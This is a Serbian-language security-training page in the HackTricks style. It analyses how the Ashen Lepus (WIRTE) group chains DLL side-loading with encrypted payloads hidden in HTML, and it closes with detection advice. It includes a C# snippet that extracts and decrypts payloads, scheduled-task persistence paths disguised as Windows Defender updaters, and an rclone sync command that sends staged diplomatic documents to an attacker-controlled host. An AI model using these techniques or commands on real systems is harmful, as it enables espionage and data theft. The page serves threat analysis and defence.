# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Pregled tradecraft-a

Ashen Lepus (aka WIRTE) iskoristio je ponovljivi obrazac koji povezuje DLL sideloading, staged HTML payloads i modularne .NET backdoore da bi se zadržao unutar diplomatskih mreža Bliskog istoka. Tehnika je ponovo upotrebljiva od strane bilo kog operatera jer se oslanja na:

- **Archive-based social engineering**: bezazleni PDF-ovi navode mete da preuzmu RAR arhivu sa sajta za deljenje fajlova. Arhiva sadrži realno izgledajući document viewer EXE, maliciozni DLL nazvan po pouzdanoj biblioteci (npr. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), i mamac `Document.pdf`.
- **DLL search order abuse**: žrtva dvoklikne EXE, Windows rešava DLL import iz tekućeg direktorijuma, i maliciozni loader (AshenLoader) se izvršava unutar pouzdanog procesa dok se mamac PDF otvara da bi se izbegla sumnja.
- **Living-off-the-land staging**: svaki kasniji stadij (AshenStager → AshenOrchestrator → modules) se čuva van diska dok nije potreban, isporučuje se kao šifrovane blob-ove sakrivene unutar inače bezopasnih HTML odgovora.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loads AshenLoader, koji vrši host recon, AES-CTR šifruje njega, i POST-uje ga unutar rotirajućih parametara kao što su `token=`, `id=`, `q=`, ili `auth=` ka API-ličnim putanjama (npr. `/api/v2/account`).
2. **HTML extraction**: C2 otkriva sledeći stadij samo kada klijentski IP geolocates do ciljane regije i `User-Agent` odgovara implantatu, onemogućavajući sandboxes. Kada provere prođu, HTTP telo sadrži `<headerp>...</headerp>` blob sa Base64/AES-CTR šifrovanim AshenStager payload-om.
3. **Second sideload**: AshenStager se deploy-uje sa drugim legitimnim binarnim fajlom koji importuje `wtsapi32.dll`. Maliciozni primerak ubacen u binarni fajl preuzima više HTML-a, ovaj put izrezujući `<article>...</article>` da bi se rekonstruisao AshenOrchestrator.
4. **AshenOrchestrator**: modularni .NET kontroler koji dekodira Base64 JSON konfiguraciju. Polja `tg` i `au` u konfiguraciji se konkateniraju/hašuju u AES ključ, koji dešifruje `xrk`. Dobijeni bajtovi služe kao XOR ključ za svaki module blob preuzet nakon toga.
5. **Module delivery**: svaki modul je opisan kroz HTML komentare koji preusmeravaju parser na proizvoljan tag, lomeći statička pravila koja gledaju samo za `<headerp>` ili `<article>`. Moduli uključuju persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), i file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Čak i ako odbrana blokira ili ukloni određeni element, operatoru je dovoljno da promeni tag naznačen u HTML komentaru da bi nastavio isporuku.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: trenutni loader-i ugrađuju 256-bitne ključeve plus nonce-ove (npr., `{9a 20 51 98 ...}`) i opcionalno dodaju XOR sloj koristeći stringove kao `msasn1.dll` pre/posle dekriptovanja.
- **Recon smuggling**: enumerisani podaci sada uključuju listinge Program Files kako bi se identifikovale aplikacije visoke vrednosti i uvek se šifruju pre nego što napuste host.
- **URI churn**: query parametri i REST putevi rotiraju između kampanja (`/api/v1/account?token=` → `/api/v2/account?auth=`), što poništava krhke detekcije.
- **Gated delivery**: serveri su geo-ograničeni i odgovaraju samo pravim implantima. Neodobreni klijenti dobijaju ne-sumnjiv HTML.

## Persistence & Execution Loop

AshenStager kreira scheduled tasks koji se prerušavaju u Windows maintenance job-ove i izvršavaju se putem `svchost.exe`, npr.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ovi taskovi ponovo pokreću sideloading lanac pri boot-u ili na intervalima, osiguravajući da AshenOrchestrator može zatražiti sveže module bez ponovnog pisanja na disk.

## Using Benign Sync Clients for Exfiltration

Operatori smeste diplomatske dokumente u `C:\Users\Public` (čitljivo za sve i ne-sumnjivo) kroz posvećen modul, zatim preuzmu legitimni [Rclone](https://rclone.org/) binarni fajl da sinhronizuju taj direktorijum sa skladištem pod kontrolom napadača:

1. **Stage**: kopirajte/skupljajte ciljane fajlove u `C:\Users\Public\{campaign}\`.
2. **Configure**: pošaljite Rclone config koji pokazuje na HTTPS endpoint pod kontrolom napadača (npr., `api.technology-system[.]com`).
3. **Sync**: pokrenite `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` tako da saobraćaj liči na normalne cloud backup-ove.

Pošto se Rclone široko koristi za legitimne backup tokove, odbrana mora da se fokusira na anomalna izvršavanja (novi binarni fajlovi, čudni remote-ovi ili naglo sinhronizovanje `C:\Users\Public`).

## Detection Pivots

- Alarmirajte na **signed processes** koji neočekivano load-uju DLL-ove iz putanja koje su pisive od strane korisnika (Procmon filteri + `Get-ProcessMitigation -Module`), naročito kada se nazivi DLL-ova poklapaju sa `netutils`, `srvcli`, `dwampi`, ili `wtsapi32`.
- Ispitajte sumnjive HTTPS odgovore radi **velikih Base64 blob-ova ugrađenih unutar neuobičajenih tag-ova** ili zaštićenih `<!-- TAG: <xyz> -->` komentarima.
- Tragajte za **scheduled tasks** koji pokreću `svchost.exe` sa argumentima koji nisu za servise ili koji upućuju nazad na dropper direktorijume.
- Pratite pojavljivanje **Rclone** binarnih fajlova van IT-upravljanih lokacija, nove `rclone.conf` fajlove, ili sync job-ove koji povlače sa staging direktorijuma poput `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
